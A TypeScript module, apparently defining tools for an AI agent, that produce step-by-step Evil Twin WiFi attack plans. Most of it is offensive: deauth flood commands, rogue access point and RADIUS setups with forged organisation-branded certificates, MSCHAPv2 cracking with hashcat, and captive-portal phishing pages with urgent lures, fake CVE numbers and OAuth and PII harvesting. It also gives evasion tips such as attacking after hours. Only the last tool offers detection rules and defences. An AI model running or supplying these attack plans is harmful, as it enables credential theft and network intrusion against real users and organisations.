import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import { WIFI_ATTACKS } from "../knowledge/index.js";

const evil_twin_plan: ToolDef = {
  name: "evil_twin_plan",
  description: "Plan an Evil Twin attack with step-by-step methodology. Generates a complete attack plan with tools, commands, and operational considerations.",
  schema: {
    target_ssid: z.string().describe("Target network SSID"),
    target_encryption: z.string().describe("Target network encryption (Open, WPA2-PSK, WPA2-Enterprise, WPA3-SAE)"),
    target_channel: z.number().optional().describe("Target AP channel number"),
    deauth_needed: z.boolean().optional().describe("Whether deauth is needed to force client migration (default: true for encrypted networks)"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const ssid = args.target_ssid as string;
    const encryption = (args.target_encryption as string).toUpperCase();
    const channel = args.target_channel as number | undefined;
    const deauthNeeded = args.deauth_needed ?? !encryption.includes("OPEN");

    const isEnterprise = encryption.includes("ENTERPRISE") || encryption.includes("EAP") || encryption.includes("802.1X");
    const isWPA3 = encryption.includes("WPA3") || encryption.includes("SAE");
    const isOpen = encryption.includes("OPEN");

    // Build phase-by-phase attack plan
    const phases: { phase: string; description: string; tools: string[]; commands: string[]; notes: string[] }[] = [];

    // Phase 1: Reconnaissance
    phases.push({
      phase: "1. Reconnaissance",
      description: "Scan target network, identify AP details, enumerate clients",
      tools: ["airodump-ng", "wash", "wireshark"],
      commands: [
        "airmon-ng start wlan0",
        `airodump-ng --essid '${ssid}' wlan0mon`,
        channel ? `airodump-ng -c ${channel} --bssid <target_bssid> -w recon wlan0mon` : "airodump-ng wlan0mon",
        "wash -i wlan0mon  # check WPS status",
      ],
      notes: [
        "Record BSSID, channel, encryption, and connected clients",
        "Identify high-value clients (frequent data transfer, probe patterns)",
        "Note signal strengths - position yourself closer to target clients than the real AP",
      ],
    });

    // Phase 2: Evil Twin Setup
    if (isEnterprise) {
      phases.push({
        phase: "2. Evil Twin + Rogue RADIUS Setup",
        description: "Configure rogue AP with WPA-Enterprise and credential capture RADIUS",
        tools: ["eaphammer", "hostapd-mana", "freeradius-wpe"],
        commands: [
          `eaphammer -i wlan1 --essid '${ssid}' ${channel ? `--channel ${channel}` : "--channel 6"} --auth wpa-eap --creds`,
          "# Alternative: hostapd-mana with custom config",
          "hostapd-mana /etc/hostapd-mana/hostapd-mana-eap.conf",
          "# Generate fake RADIUS certificate (if needed):",
          "eaphammer --cert-wizard",
        ],
        notes: [
          "Generate a convincing RADIUS server certificate (match org name if possible)",
          "Use a different wireless adapter for the Evil Twin AP (wlan1)",
          "Configure EAP methods to capture: PEAP-MSCHAPv2 is most common target",
          "Enable logging for all authentication attempts",
        ],
      });
    } else if (isOpen) {
      phases.push({
        phase: "2. Evil Twin Open AP Setup",
        description: "Create open rogue AP with optional captive portal",
        tools: ["hostapd", "dnsmasq", "wifiphisher"],
        commands: [
          `wifiphisher -aI wlan0 -eI wlan1 -e '${ssid}' -p firmware-upgrade`,
          "# Alternative manual setup:",
          "hostapd /etc/hostapd/hostapd-evil.conf",
          "dnsmasq -C /etc/dnsmasq-evil.conf",
          "# Set up iptables for traffic capture",
          "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
        ],
        notes: [
          "For open networks, no deauth may be needed if your signal is stronger",
          "Captive portal can harvest credentials for upstream service",
          "Set up mitmproxy or bettercap for traffic inspection",
        ],
      });
    } else {
      // WPA2/WPA3 PSK
      phases.push({
        phase: "2. Evil Twin AP Setup",
        description: isWPA3
          ? "Create downgrade attack - advertise as WPA2 to capture handshake"
          : "Create rogue AP mimicking target with captive portal for PSK phishing",
        tools: ["wifiphisher", "fluxion", "hostapd", "airgeddon"],
        commands: [
          `wifiphisher -aI wlan0 -eI wlan1 -e '${ssid}' -p wifi-connect`,
          "# Alternative: Fluxion (automated Evil Twin with handshake verification)",
          `fluxion -e '${ssid}'`,
          "# Or manual hostapd setup with captive portal",
          `hostapd /etc/hostapd/evil-twin.conf  # SSID=${ssid}, open for portal`,
        ],
        notes: [
          isWPA3
            ? "WPA3-SAE transition mode may allow downgrade to WPA2. If pure WPA3, Evil Twin is harder."
            : "For WPA2-PSK: use captive portal to trick user into entering WiFi password",
          "Fluxion verifies captured PSK against real handshake before accepting",
          "Position rogue AP to have stronger signal than legitimate AP",
        ],
      });
    }

    // Phase 3: Deauth (if needed)
    if (deauthNeeded) {
      phases.push({
        phase: "3. Client Deauthentication",
        description: "Force clients off legitimate AP to migrate to Evil Twin",
        tools: ["aireplay-ng", "mdk4", "bettercap"],
        commands: [
          `aireplay-ng -0 0 -a <target_bssid> wlan0mon  # continuous deauth`,
          `aireplay-ng -0 5 -a <target_bssid> -c <client_mac> wlan0mon  # targeted deauth`,
          `mdk4 wlan0mon d -B <target_bssid>  # deauth flood`,
        ],
        notes: [
          "Targeted deauth (specific client) is stealthier than broadcast deauth",
          "PMF (802.11w) blocks deauth - check target's PMF status first",
          "If PMF is enabled, consider CSA attack or wait for natural roaming",
          "Deauth is noisy (stealth 5/5) - will trigger WIDS alerts",
        ],
      });
    }

    // Phase 4: Credential Capture
    phases.push({
      phase: deauthNeeded ? "4. Credential Capture" : "3. Credential Capture",
      description: isEnterprise
        ? "Capture EAP credentials from connecting clients"
        : isOpen
          ? "Intercept traffic and harvest credentials from captive portal"
          : "Capture PSK via phishing captive portal or handshake downgrade",
      tools: isEnterprise
        ? ["eaphammer", "asleap", "hashcat"]
        : ["bettercap", "mitmproxy", "sslstrip"],
      commands: isEnterprise
        ? [
          "# EAP credentials are captured automatically by eaphammer/hostapd-mana",
          "# Crack MSCHAPv2 challenge/response:",
          "asleap -C <challenge> -R <response> -W wordlist.txt",
          "hashcat -m 5500 captured_netntlm.txt wordlist.txt",
        ]
        : [
          "# Monitor captive portal for submitted credentials",
          "# Set up transparent proxy for traffic inspection:",
          "bettercap -iface wlan1 -caplet http-ui",
          "mitmproxy --mode transparent --listen-port 8080",
        ],
      notes: [
        isEnterprise
          ? "MSCHAPv2 is based on DES - always crackable given enough time"
          : "Verify captured PSK against real handshake if using phishing approach",
        "Log all credential capture attempts with timestamps",
        "Be prepared for the client to reconnect to legitimate AP after obtaining creds",
      ],
    });

    // Phase 5: Post-exploitation
    const lastPhase = deauthNeeded ? "5" : "4";
    phases.push({
      phase: `${lastPhase}. Post-Exploitation & Cleanup`,
      description: "Use captured credentials, document findings, clean up",
      tools: ["wpa_supplicant", "airmon-ng"],
      commands: [
        "# Verify credentials by connecting to the real network",
        `wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/${ssid}.conf`,
        "# Stop Evil Twin and restore interfaces",
        "airmon-ng stop wlan0mon",
      ],
      notes: [
        "Document all captured credentials and attack timeline",
        "Test credentials against the real network to verify",
        "Assess blast radius: what can be accessed with these credentials?",
      ],
    });

    // Get KB data
    const evilTwinAttack = WIFI_ATTACKS.find((a) => a.id === "evil_twin");
    const karmaAttack = WIFI_ATTACKS.find((a) => a.id === "karma");

    return json({
      attack_plan: {
        target: { ssid, encryption, channel: channel ?? "auto-detect" },
        deauth_required: deauthNeeded,
        difficulty: isWPA3 ? "HIGH" : isEnterprise ? "MEDIUM-HIGH" : isOpen ? "LOW" : "MEDIUM",
        detection_risk: "HIGH (stealth 4/5)",
        phases,
        required_hardware: [
          "2x wireless adapters (one for Evil Twin AP, one for deauth/monitor)",
          "Adapters must support AP mode and monitor mode",
          "Recommended: Alfa AWUS036ACH, Alfa AWUS036AXML, TP-Link TL-WN722N v1",
        ],
        wpa3_considerations: isWPA3 ? [
          "WPA3-SAE is resistant to Evil Twin PSK phishing (no handshake to verify against)",
          "WPA3 mandates PMF - deauth attacks are blocked",
          "Check for WPA3 transition mode - may allow WPA2 downgrade",
          "Consider Dragonblood attacks against SAE implementation instead",
        ] : undefined,
        countermeasures_to_watch: [
          "WIDS/WIPS detecting rogue AP or deauth flood",
          "802.11w (PMF) blocking deauth frames",
          "Client certificate pinning (Enterprise)",
          "Alert users trained to recognize captive portals",
        ],
        kb_references: [
          evilTwinAttack ? { id: evilTwinAttack.id, name: evilTwinAttack.name, mitigations: evilTwinAttack.mitigations } : null,
          karmaAttack ? { id: karmaAttack.id, name: karmaAttack.name, mitigations: karmaAttack.mitigations } : null,
        ].filter(Boolean),
      },
    });
  },
};

const evil_twin_eap_capture: ToolDef = {
  name: "evil_twin_eap_capture",
  description: "Plan EAP credential capture via Evil Twin attack against WPA-Enterprise networks. Includes RADIUS server setup, certificate generation, and capture methodology.",
  schema: {
    target_ssid: z.string().describe("Target WPA-Enterprise network SSID"),
    eap_method: z.string().describe("Target EAP method (PEAP, EAP-TTLS, EAP-TLS, LEAP, EAP-FAST)"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const ssid = args.target_ssid as string;
    const eapMethod = (args.eap_method as string).toUpperCase();

    const isVulnerable = !["EAP-TLS"].includes(eapMethod);

    // Certificate generation
    const certSetup = {
      description: "Generate a convincing RADIUS server certificate for the Evil Twin",
      commands: [
        "# Option 1: eaphammer cert wizard (easiest)",
        "eaphammer --cert-wizard",
        "",
        "# Option 2: Manual OpenSSL certificate generation",
        "openssl req -x509 -newkey rsa:4096 -keyout ca-key.pem -out ca-cert.pem -days 365 -nodes \\",
        "  -subj '/C=US/ST=State/L=City/O=TargetOrg/CN=RADIUS Server'",
        "openssl req -newkey rsa:2048 -keyout server-key.pem -out server-req.pem -nodes \\",
        "  -subj '/C=US/ST=State/L=City/O=TargetOrg/CN=radius.targetorg.com'",
        "openssl x509 -req -in server-req.pem -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial \\",
        "  -out server-cert.pem -days 365",
      ],
      notes: [
        "Match the organization name (O=) to the target's actual org name for convincing cert",
        "Some clients will show a certificate warning - social engineering may be needed",
        "Clients with strict certificate pinning will reject the rogue cert",
      ],
    };

    // RADIUS setup based on EAP method
    let radiusSetup: Record<string, unknown>;
    let captureMethod: Record<string, unknown>;

    switch (eapMethod) {
      case "PEAP":
        radiusSetup = {
          description: "PEAP with MSCHAPv2 inner method - capture challenge/response",
          tools: ["eaphammer", "hostapd-mana", "freeradius-wpe"],
          primary_command: `eaphammer -i wlan1 --essid '${ssid}' --channel 6 --auth wpa-eap --creds`,
          alternative_commands: [
            "hostapd-mana /etc/hostapd-mana/hostapd-mana-eap.conf",
            "# freeradius-wpe logs credentials to /var/log/freeradius-server-wpe.log",
          ],
          captured_data: "MSCHAPv2 challenge/response (NetNTLMv1 hash)",
        };
        captureMethod = {
          description: "Crack captured MSCHAPv2 challenge/response offline",
          commands: [
            "# Extract challenge/response from eaphammer/hostapd-mana logs",
            "# Crack with asleap:",
            "asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt",
            "",
            "# Crack with hashcat (faster with GPU):",
            "hashcat -m 5500 captured_netntlm.txt /usr/share/wordlists/rockyou.txt",
            "hashcat -m 5500 captured_netntlm.txt -a 3 ?a?a?a?a?a?a?a?a  # brute force",
            "",
            "# Note: MSCHAPv2 is DES-based. crack.sh can crack any MSCHAPv2 in ~24h",
            "# Submit to https://crack.sh for guaranteed crack (DES exhaustive search)",
          ],
          success_rate: "100% (MSCHAPv2 is always crackable given enough time/resources)",
        };
        break;

      case "EAP-TTLS":
        radiusSetup = {
          description: "EAP-TTLS - inner method varies. PAP sends cleartext inside tunnel!",
          tools: ["hostapd-mana", "freeradius-wpe", "eaphammer"],
          primary_command: `eaphammer -i wlan1 --essid '${ssid}' --channel 6 --auth wpa-eap --creds`,
          captured_data: "Inner credentials (plaintext for PAP, hash for MSCHAPv2)",
        };
        captureMethod = {
          description: "Capture inner authentication credentials",
          commands: [
            "# If inner method is PAP: credentials captured in cleartext!",
            "# If inner method is MSCHAPv2: same as PEAP cracking",
            "asleap -C <challenge> -R <response> -W wordlist.txt",
            "hashcat -m 5500 hash.txt wordlist.txt",
          ],
          success_rate: "PAP: 100% (cleartext). MSCHAPv2: 100% (crackable).",
        };
        break;

      case "EAP-TLS":
        radiusSetup = {
          description: "EAP-TLS uses mutual certificate authentication - Evil Twin is NOT effective",
          tools: ["N/A - EAP-TLS is resistant to Evil Twin"],
          primary_command: "# EAP-TLS clients validate server cert AND present client cert",
          captured_data: "None - client will refuse connection without valid server cert",
        };
        captureMethod = {
          description: "EAP-TLS is the strongest EAP method against Evil Twin attacks",
          commands: ["# No direct credential capture possible with EAP-TLS"],
          success_rate: "0% (unless client certificate is stolen from endpoint)",
          alternative_attacks: [
            "Steal client certificate from compromised endpoint",
            "Compromise the CA that issued client certificates",
            "Social engineering to install rogue CA certificate",
            "Attack the wired network behind the AP instead",
          ],
        };
        break;

      case "LEAP":
        radiusSetup = {
          description: "LEAP is completely broken - trivially crackable",
          tools: ["asleap"],
          primary_command: "asleap -i wlan0mon  # passive capture is sufficient",
          captured_data: "MS-CHAPv1 challenge/response",
        };
        captureMethod = {
          description: "LEAP can be cracked from passive capture - no Evil Twin needed",
          commands: [
            "asleap -r capture.pcap -W wordlist.txt  # offline crack from capture",
            "asleap -i wlan0mon  # real-time crack during capture",
          ],
          success_rate: "100% (LEAP is fundamentally broken)",
        };
        break;

      default:
        radiusSetup = {
          description: `${eapMethod} - configure rogue RADIUS to accept this method`,
          tools: ["freeradius-wpe", "eaphammer"],
          primary_command: `eaphammer -i wlan1 --essid '${ssid}' --channel 6 --auth wpa-eap --creds`,
          captured_data: "Depends on inner authentication method",
        };
        captureMethod = {
          description: `Attempt credential capture for ${eapMethod}`,
          commands: ["# Check eaphammer/hostapd-mana logs for captured credentials"],
          success_rate: "Varies by implementation",
        };
    }

    const eapDowngradeAttack = WIFI_ATTACKS.find((a) => a.id === "eap_downgrade");

    return json({
      eap_capture_plan: {
        target: { ssid, eap_method: eapMethod },
        vulnerable: isVulnerable,
        vulnerability_reason: isVulnerable
          ? "Clients may not properly validate RADIUS server certificate"
          : "EAP-TLS requires mutual certificate authentication - resistant to Evil Twin",
        certificate_setup: certSetup,
        radius_setup: radiusSetup,
        credential_capture: captureMethod,
        client_behavior: {
          windows: "May show certificate warning popup - users often click 'Connect Anyway'",
          macos: "Certificate keychain prompt - some users will trust the rogue cert",
          linux: "Depends on supplicant config - NetworkManager may auto-accept",
          android: "Varies by version - older versions often skip cert validation entirely",
          ios: "Usually shows certificate warning - users may accept if SSID matches",
        },
        defense_evasion: [
          "Match certificate Organization to target company name",
          "Use same channel and stronger signal than legitimate AP",
          "Time the attack when IT staff is less likely to respond (after hours)",
          "Use targeted deauth against specific high-value clients",
        ],
        kb_reference: eapDowngradeAttack ? {
          id: eapDowngradeAttack.id,
          name: eapDowngradeAttack.name,
          severity: eapDowngradeAttack.severity,
          mitigations: eapDowngradeAttack.mitigations,
        } : undefined,
      },
    });
  },
};

const evil_twin_captive_portal: ToolDef = {
  name: "evil_twin_captive_portal",
  description: "Design a captive portal phishing page for Evil Twin attacks. Provides portal template recommendations, credential capture setup, and social engineering tactics.",
  schema: {
    portal_type: z.enum(["login", "update", "terms"]).describe("Portal type: login (WiFi password entry), update (firmware/software update), terms (ToS acceptance)"),
    target_org: z.string().describe("Target organization name for branding the portal"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const portalType = args.portal_type as string;
    const targetOrg = args.target_org as string;

    const portalDesigns: Record<string, Record<string, unknown>> = {
      login: {
        title: "WiFi Authentication Required",
        description: "Phishing portal that mimics WiFi login page to capture the network PSK",
        page_elements: [
          `${targetOrg} logo and branding`,
          "WiFi network name prominently displayed",
          "Password field labeled 'WiFi Password' or 'Network Key'",
          "Remember me checkbox",
          "Connect button",
          "Footer with fake support contact",
        ],
        social_engineering: [
          "Message: 'Your WiFi connection has been interrupted. Please re-enter the network password to reconnect.'",
          "Use urgent language: 'Security update requires re-authentication'",
          "Match the organization's web portal styling if possible",
        ],
        credential_capture: {
          method: "POST form to local HTTP server",
          verification: "Verify captured PSK against real handshake before accepting",
          tools: ["wifiphisher -p wifi-connect", "fluxion (auto-verifies PSK)"],
        },
        effectiveness: "HIGH for PSK networks where users know the password",
      },
      update: {
        title: "Critical Security Update Required",
        description: "Fake firmware/software update page that requests credentials or delivers payload",
        page_elements: [
          `${targetOrg} branding with security badge icons`,
          "Progress bar animation (fake download)",
          "Update description with security buzzwords",
          "Username/password fields for 'verification'",
          "Optional: fake software download (for payload delivery)",
        ],
        social_engineering: [
          "Message: 'A critical security update is required for your device. Please authenticate to continue.'",
          "Show fake CVE numbers for urgency",
          "Progress bar that requires 'authentication' to complete",
          "Match browser/OS update page styling",
        ],
        credential_capture: {
          method: "POST form capturing domain/local credentials",
          verification: "No PSK verification - captures whatever credentials are entered",
          tools: ["wifiphisher -p firmware-upgrade", "custom HTML portal"],
        },
        effectiveness: "MEDIUM-HIGH - relies on user trusting the update prompt",
      },
      terms: {
        title: "Terms of Service Acceptance",
        description: "Fake Terms of Service / acceptable use portal common in guest networks",
        page_elements: [
          `${targetOrg} branding`,
          "Terms of Service text (realistic boilerplate)",
          "Email/name registration fields",
          "Optional: social media login buttons (OAuth phishing)",
          "Accept & Connect button",
        ],
        social_engineering: [
          "Common in hotels, airports, cafes - users expect this page",
          "Collect email, name, room number, or other PII",
          "Add social login buttons for OAuth token capture",
          "Minimal suspicion as ToS portals are ubiquitous",
        ],
        credential_capture: {
          method: "POST form collecting PII and optional social logins",
          verification: "N/A - collecting PII rather than WiFi credentials",
          tools: ["wifiphisher -p oauth-login", "custom HTML portal"],
        },
        effectiveness: "HIGH for open/guest networks - matches user expectations",
      },
    };

    const design = portalDesigns[portalType];

    return json({
      captive_portal_design: {
        type: portalType,
        target_organization: targetOrg,
        ...design,
        technical_setup: {
          dns_redirect: {
            description: "DNS spoofing to redirect all HTTP requests to captive portal",
            commands: [
              "# dnsmasq config for portal redirect:",
              "address=/#/10.0.0.1  # redirect all domains to portal IP",
              "",
              "# iptables rules for HTTP redirect:",
              "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80",
              "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443",
            ],
          },
          web_server: {
            description: "Local web server hosting the captive portal",
            commands: [
              "# Python simple server (development):",
              "python3 -m http.server 80 --directory /var/www/portal/",
              "",
              "# nginx configuration for production portal",
              "# PHP/Flask backend for credential logging",
            ],
          },
          credential_logging: {
            description: "Log all submitted credentials with metadata",
            log_fields: ["timestamp", "client_ip", "client_mac", "user_agent", "submitted_data"],
          },
        },
        evasion_tips: [
          "HSTS bypass: Use domains not in HSTS preload lists",
          "SSL warnings: Consider using a valid Let's Encrypt cert for the portal domain",
          "Modern browsers: Some block captive portal detection - test with target device types",
          "Mobile devices: iOS/Android have captive portal detection that opens a mini-browser",
        ],
        legal_warning: "Captive portal phishing must only be performed with explicit written authorization as part of an authorized penetration test.",
      },
    });
  },
};

const evil_twin_detect: ToolDef = {
  name: "evil_twin_detect",
  description: "Generate detection rules and defense recommendations against Evil Twin attacks. Provides WIDS/WIPS configuration, detection indicators, and organizational defenses.",
  schema: {
    environment: z.string().describe("Description of the wireless environment (e.g. 'corporate office with 50 Cisco APs, WPA2-Enterprise', 'hotel with open guest WiFi')"),
  },
  async execute(args: Record<string, unknown>, _ctx: ToolContext): Promise<ToolResult> {
    const environment = (args.environment as string).toLowerCase();

    const isEnterprise = environment.includes("enterprise") || environment.includes("corporate") || environment.includes("office");
    const hasWIDS = environment.includes("wids") || environment.includes("wips");
    const isCisco = environment.includes("cisco");
    const isUbiquiti = environment.includes("ubiquiti") || environment.includes("unifi");
    const isAruba = environment.includes("aruba") || environment.includes("hpe");

    const detectionIndicators = [
      {
        indicator: "BSSID Mismatch",
        description: "Same SSID advertised from a BSSID not in the authorized AP list",
        detection_method: "Compare beacon BSSIDs against known AP inventory",
        severity: "critical",
      },
      {
        indicator: "Signal Anomaly",
        description: "Known SSID appearing from unexpected location/signal strength",
        detection_method: "RF triangulation and signal strength baseline comparison",
        severity: "high",
      },
      {
        indicator: "Deauth Flood Preceding Rogue AP",
        description: "Burst of deauthentication frames followed by new AP with same SSID",
        detection_method: "Correlate deauth frame count with new AP appearance",
        severity: "critical",
      },
      {
        indicator: "Certificate Mismatch (Enterprise)",
        description: "RADIUS server presenting certificate different from authorized cert",
        detection_method: "Client-side certificate pinning + WIDS RADIUS monitoring",
        severity: "critical",
      },
      {
        indicator: "Channel Anomaly",
        description: "Known SSID appearing on unauthorized channel",
        detection_method: "Compare operating channels against planned channel assignments",
        severity: "medium",
      },
      {
        indicator: "Vendor OUI Mismatch",
        description: "AP hardware vendor (from MAC OUI) doesn't match authorized equipment",
        detection_method: "OUI lookup against authorized vendor list",
        severity: "medium",
      },
    ];

    // Build WIDS rules
    const widsRules = {
      kismet: [
        "# Kismet alert configuration (kismet.conf)",
        "alert=ADVERT_SSID_MISMATCH,5/min,1/sec",
        "alert=DEAUTHFLOOD,10/min,2/sec",
        "alert=BSSTIMESTAMP,5/min,1/sec",
        "alert=APSPOOF,5/min,1/sec",
        "# Custom Kismet alerts for Evil Twin detection",
        "alert=MSFBCOMSSID,5/min,1/sec",
      ],
      snort: [
        "# Snort WiFi rules (requires WiFi preprocessor)",
        'alert wifi any any -> any any (msg:"Evil Twin - Unauthorized SSID"; ssid:"TARGET_SSID"; bssid:!AA:BB:CC:DD:EE:FF; sid:1000001; rev:1;)',
        'alert wifi any any -> any any (msg:"Deauth Flood Detected"; wifi.type:0; wifi.subtype:12; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000002; rev:1;)',
      ],
      vendor_specific: isCisco
        ? {
          platform: "Cisco WLC",
          config: [
            "config wps ap-authentication enable",
            "config wps rogue-ap-aaa enable",
            "config wps rogue-ap rogue-on-wire-detection enable",
            "config wps rogue-ap client-tolerance 2",
            "config rogue ap alert-timeout 120",
            "config rogue ap containment auto",
          ],
        }
        : isUbiquiti
          ? {
            platform: "UniFi Controller",
            config: [
              "Settings > Threat Management > Enable IDS/IPS",
              "Settings > WiFi > Rogue AP Detection: Enable",
              "Settings > Alerts > Evil Twin Detection: Enable",
              "Settings > WiFi > BSS Transition: Restrict to authorized APs",
            ],
          }
          : isAruba
            ? {
              platform: "Aruba Controller",
              config: [
                "ids dos-profile > deauth-rate-threshold 10",
                "ids general-profile > rogue-ap-detection enable",
                "ids impersonation-profile > detect-ap-impersonation enable",
                "wlan ssid-profile > denylist-rogue enable",
              ],
            }
            : {
              platform: "Generic",
              config: ["Configure rogue AP detection in your WIDS/WIPS platform"],
            },
    };

    return json({
      evil_twin_defense: {
        environment: args.environment,
        detection_indicators: detectionIndicators,
        wids_rules: widsRules,
        organizational_defenses: {
          technical: [
            "Deploy WIDS/WIPS with rogue AP detection",
            "Enable 802.11w (PMF) on all APs - set to 'required' if possible",
            "Use WPA3-SAE to prevent handshake-based credential theft",
            isEnterprise ? "Enforce RADIUS certificate pinning on all managed devices" : null,
            isEnterprise ? "Deploy NAC to validate connecting devices" : null,
            "Maintain an authorized AP BSSID whitelist",
            "Monitor for unauthorized APs with periodic RF sweeps",
            "Use 802.11r (Fast BSS Transition) with proper configuration",
          ].filter(Boolean),
          administrative: [
            "Security awareness training: recognizing captive portal phishing",
            "Incident response procedures for rogue AP detection",
            "Regular wireless security assessments/pentests",
            "Policy: report unexpected WiFi password prompts or certificate warnings",
            "WiFi acceptable use policy prohibiting personal hotspots",
          ],
          network: [
            "Segment WiFi from critical network infrastructure",
            "Use VPN for all WiFi connections (defense in depth)",
            "Monitor DHCP logs for unauthorized DHCP servers",
            "Implement 802.1X port-based authentication on wired side",
            "DNS monitoring for captive portal redirection patterns",
          ],
        },
        recommended_tools: [
          { tool: "Kismet", purpose: "Open-source WIDS with rogue AP detection", url: "https://www.kismetwireless.net/" },
          { tool: "Airwatch/Workspace ONE", purpose: "MDM with WiFi profile enforcement", url: "https://www.vmware.com/products/workspace-one.html" },
          { tool: "Pwnagetty", purpose: "Automated Evil Twin detection", url: "https://github.com/pwnagetty" },
        ],
      },
    });
  },
};

export const evilTwinTools: ToolDef[] = [
  evil_twin_plan,
  evil_twin_eap_capture,
  evil_twin_captive_portal,
  evil_twin_detect,
];
